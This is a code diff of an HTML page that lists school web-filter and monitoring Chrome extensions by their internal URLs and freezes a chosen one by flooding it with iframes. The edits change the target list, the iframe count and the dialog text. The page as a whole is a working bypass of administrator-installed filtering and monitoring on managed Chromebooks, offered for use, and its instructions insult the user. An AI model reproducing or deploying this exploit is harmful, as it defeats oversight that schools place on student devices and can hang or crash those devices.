@@ -29,13 +29,13 @@
         padding: 0px;
       }
       body {
-        background-color: #000000;
+        background-color: #1e2324;
         width: 100%;
         height: 100%;
         margin: 0px;
       }
       button {
-        background-color: #33626c;
+        background-color: red;
         padding: 6px;
         padding-left: 8px;
         padding-right: 8px;
@@ -109,14 +109,6 @@
           name: "Securly Classroom",
           url: "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html"
         },
-        "hapara": {
-          name: "Hapara",
-          url: "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html"
-        },
-        "hapara-new-id": {
-          name: "Hapara",
-          url: "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html"
-        },
         "iboss": {
           name: "iboss",
           url: "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html"
@@ -137,10 +129,6 @@
           name: "InterSafe GatewayConnection Agent",
           url: "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js"
         },
-        "loilo": {
-          name: "ロイロWebフィルター/LoiLo Web Filters",
-          url: "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png"
-        },
         "gopher_buddy": {
           name: "Gopher Buddy",
           url: "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png"
@@ -148,14 +136,6 @@
         "lanschool_helper": {
           name: "LanSchool Web Helper",
           url: "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html"
-        },
-        "imtlazarus": {
-          name: "IMTLazarus",
-          url: "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json"
-        },
-        "impero_backdrop": {
-          name: "Impero Backdrop",
-          url: "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html"
         },
         "mobile_guardian": {
           name: "Mobile Guardian",
@@ -217,8 +197,11 @@
       }
 
       function button_handler(extension) {
-        let cancel = !confirm("After clicking OK, there will be a 3 second delay until the extension freezes. Switch to another tab immediately to prevent the device from freezing. like immediately. right now. don\'t wait. like click OK and switch to that tab. no, don\'t ask me why, just do it, or you can open an issue on the github page, but right now you\'re talking to a screen.");
-        if (cancel) return;
+        let cancel = !prompt("Freeze " + extension.name + "? \n\nAfter clicking OK, there will be a 3 second delay until the extension freezes. Switch to another tab immediately to prevent the device from freezing. like immediately. right now. don\'t wait. like click OK and switch to that tab. no, don\'t ask me why, just do it, or you can open an issue on the github page, but right now you\'re talking to a screen.", "run freezeProcess(\"" + extension.name + "\", type:chromium_browser_extension); on Error push AbortError;");
+        if (cancel) {
+			prompt("Process cancelled.", "abortProcess(\"12649\");");
+			return;
+		}
         
         setTimeout(() => {
           create_iframes(extension);
@@ -236,7 +219,7 @@
           iframes.push(iframe);
 
           //let subframe_count = Math.max(2, 200 - iterations);
-          for (let i=0; i<50; i++) {
+          for (let i=0; i<5; i++) {
             let subframe = document.createElement("iframe");
             subframe.src = public_url;
             subframe.style.width = subframe.style.height = "1px";
@@ -269,7 +252,7 @@
         <li>The extension should be temporarily disabled. For this effect to persist, toggle the "Allow access to file URLs" again every few minutes, or if pages start getting blocked again (this).</li>
         <li>You may also need to reopen this page every once in a while to prevent memory loss from crashing the system. But Chromebooks barely have any storage, so don't worry, you won't lose much.</li>
       </ol>
-      <p>During this process, your device may hang momentarily. DON'T PANIC, IDIOT. This is normal, and it should resolve itself after a few seconds. If it doesn't press the power button and HOLD IT DOWN, then  press the key labeled "esc" and the key with the refresh icon at the same time WHILE HOLDING THE POWER BUTTON! i can't believe i'm typing this out... Anyway the buttons should appear below. Like down there. Unless your school uses an extension that isn't supported. No, wait, no, again, it's not my fault, go open a new issue on the GitHub page.</p>
+      <p>During this process, your device may hang momentarily. DON'T PANIC, IDIOT. This is normal, and it should resolve itself after a few seconds. If it doesn't press the power button and HOLD IT DOWN, then  press the key with the refresh icon WHILE HOLDING THE POWER BUTTON! i can't believe i'm typing this out... Anyway the buttons should appear below. Like down there. Unless your school uses an extension that isn't supported. No, wait, no, again, it's not my fault, go open a new issue on the GitHub page.</p>
       <div id="buttons_container"> 
         <p><i>Detecting extensions...</i></p>
       </div>
@@ -277,7 +260,6 @@
       <hr>
         <p style="margin-bottom: 8px;">
           BuBu Proprietary Software
-			
 		</p>
     </div>
   </body>
